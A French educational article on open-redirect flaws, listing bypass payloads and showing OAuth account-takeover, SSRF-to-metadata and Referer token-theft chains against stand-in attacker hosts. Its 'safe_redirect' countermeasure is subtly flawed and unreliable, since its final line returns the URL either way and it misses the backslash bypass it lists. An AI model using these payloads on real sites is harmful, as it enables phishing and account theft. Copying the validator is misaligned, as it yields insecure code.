---
title: Open Redirect
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [open-redirect, web, phishing, ssrf, bug-bounty, sécurité]
date: 2026-03-22
---

# Open Redirect

Un open redirect est une vulnérabilité où une application web redirige l'utilisateur vers une URL fournie par le paramètre de la requête, sans valider que cette URL appartient au domaine légitime. Seule, la vulnérabilité mène au phishing. Chaînée avec d'autres bugs, elle peut avoir un impact critique.

## Mécanisme

```
# URL vulnérable normale
https://site.com/login?next=/dashboard

# Exploitation : rediriger vers un site de phishing
https://site.com/login?next=https://site-pirate.com/faux-login

# La victime voit l'URL du site de confiance, clique, et atterrit sur le site pirate
```

La confiance vient du fait que le domaine initial (`site.com`) est légitime. Les filtres anti-phishing par email laissent souvent passer ces liens.

## Paramètres courants à tester

```
?next=
?redirect=
?redirect_uri=
?return=
?returnTo=
?url=
?goto=
?dest=
?destination=
?continue=
?target=
?rurl=
?redirect_url=
?forward=
```

## Techniques de bypass

Les développeurs tentent souvent de filtrer les redirections. Voici comment contourner les protections naïves :

### Bypass de validation de domaine

```
# Filtre naïf : vérifie si l'URL contient "site.com"
https://site-pirate.com/page?host=site.com          # contient site.com → passe
https://site.com.attaquant.com/                     # sous-domaine trompeur
https://attaquant.com/site.com                      # path qui ressemble au domaine

# Bypass avec @
https://site.com@attaquant.com/                     # navigateurs vont sur attaquant.com
                                                    # @ sépare les credentials de l'hôte

# Bypass avec //
?next=//attaquant.com                               # interprété comme protocole-relatif
?next=////attaquant.com

# Bypass avec \
?next=\attaquant.com                                # certains navigateurs normalisent \ en /
?next=\/\/attaquant.com

# Bypass avec encodage
?next=%68%74%74%70%73%3a%2f%2f%61%74%74%61%71%75%61%6e%74%2e%63%6f%6d
?next=https:%2f%2fattaquant.com                    # double-encodage du /
```

### Bypass avec fragments

```
?next=https://attaquant.com#site.com               # fragment ignoré par le serveur
?next=https://attaquant.com%23site.com             # # encodé
```

### Bypass de liste blanche

```
# Si le filtre n'autorise que *.site.com
https://evil.site.com/                              # si sous-domaine contrôlable
https://site.com.evil.com/                          # confusion de domaine

# Open redirect sur un sous-domaine autorisé
https://cdn.site.com/redirect?to=//attaquant.com  # chaîner deux open redirects
```

## Impact et chaînage

L'open redirect seul est souvent classé "low" ou "informationnel". Sa valeur est dans le chaînage.

### Chain 1 : OAuth Account Takeover

```
# Dans OAuth, le redirect_uri doit correspondre à un domaine enregistré
# Si site.com est enregistré, et site.com a un open redirect :

https://auth.provider.com/oauth?
  client_id=myapp&
  redirect_uri=https://site.com/redirect?next=https://attaquant.com&
  response_type=code

# Le code d'autorisation OAuth est envoyé à attaquant.com dans le Referer/URL
→ Account Takeover complet
```

### Chain 2 : SSRF escalation

```
# Un filtre SSRF vérifie que l'URL est dans la whitelist
# Mais si le domaine whitelisté a un open redirect :

POST /api/fetch
{"url": "https://site-autorisé.com/redirect?next=http://169.254.169.254/"}

→ Le serveur suit le redirect → accès aux métadonnées AWS (SSRF)
```

### Chain 3 : Vol de tokens via Referer

```
# Si le token est dans l'URL et que la page redirige
https://site.com/reset?token=ABC123&next=https://attaquant.com

# Le navigateur envoie :
Referer: https://site.com/reset?token=ABC123

# Le serveur attaquant.com reçoit le token dans le header Referer
→ Compromission du compte
```

## Détection

```bash
# Test manuel basique
curl -v "https://site.com/redirect?url=https://evil.com" 2>&1 | grep -i "location:"

# Avec ffuf
ffuf -u "https://site.com/redirect?url=FUZZ" \
     -w /usr/share/seclists/Fuzzing/redirect.txt \
     -mr "Location: https://evil" -H "Authorization: Bearer $TOKEN"

# Vérifier aussi les réponses avec meta refresh
<meta http-equiv="refresh" content="0;url=https://attaquant.com">

# Et les redirects JavaScript
window.location = urlParam;
document.location.href = urlParam;
```

## Contre-mesures

```python
from urllib.parse import urlparse

def safe_redirect(url, allowed_hosts=None):
    if allowed_hosts is None:
        allowed_hosts = ['monsite.com', 'www.monsite.com']

    parsed = urlparse(url)

    # Rejeter les URLs absolues vers d'autres domaines
    if parsed.netloc and parsed.netloc not in allowed_hosts:
        return '/home'  # Fallback vers page sûre

    # Rejeter les schémas dangereux
    if parsed.scheme not in ('', 'http', 'https'):
        return '/home'

    # Accepter uniquement les chemins relatifs si possible
    return url if parsed.netloc in allowed_hosts else url

# Solution la plus robuste : liste blanche de destinations
ALLOWED_REDIRECTS = {
    'post-login': '/dashboard',
    'post-purchase': '/orders',
    'post-logout': '/login',
}
destination = ALLOWED_REDIRECTS.get(request.args.get('next'), '/home')
```
